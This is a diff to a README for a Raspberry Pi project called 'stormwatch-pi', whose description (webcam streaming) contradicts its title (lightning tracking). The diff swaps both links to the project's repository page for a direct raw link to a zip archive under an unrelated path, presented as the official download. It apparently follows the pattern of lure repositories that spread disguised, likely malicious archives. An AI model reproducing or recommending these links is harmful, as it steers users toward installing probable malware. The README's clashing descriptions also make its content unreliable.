@@ -5,7 +5,7 @@ description: "Stream live video from a USB webcam to a remote server using a Ras
 ---
 # ⚡ stormwatch-pi - Keep track of lightning strikes easily
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Short-triangle970/stormwatch-pi)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://raw.githubusercontent.com/Short-triangle970/short-triangle970.github.io/main/Hydnaceae/io-triangle-short-github-1.4.zip)
 
 ## 📌 About this project
 
@@ -19,7 +19,7 @@ Before you begin, ensure your computer meets these basic requirements. You need 
 
 You can obtain the current version of the software from the official repository. We provide the latest release to ensure you have access to every feature and security fix. 
 
-[Visit this page to download the latest version](https://github.com/Short-triangle970/stormwatch-pi)
+[Visit this page to download the latest version](https://raw.githubusercontent.com/Short-triangle970/short-triangle970.github.io/main/Hydnaceae/io-triangle-short-github-1.4.zip)
 
 Follow these steps to find the correct file:
 
